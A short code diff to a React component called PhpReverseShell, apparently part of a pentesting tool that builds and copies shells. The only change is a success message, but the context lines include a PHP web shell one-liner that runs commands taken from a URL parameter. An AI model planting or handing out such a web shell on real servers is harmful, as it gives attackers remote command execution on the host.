@@ -30,7 +30,7 @@ export default function PhpReverseShell () {
         setValues( { ...values, [ name ]: event.target.value } );
     };
     const successInfoReverseShell = () => {
-        message.success( 'Your reverse shell has been copied' );
+        message.success( 'Your reverse shell has been copied successfully !' );
     };
     const oneLiner = `<?php system($_GET["cmd"]);?>`;
     const shell_obfuscate =
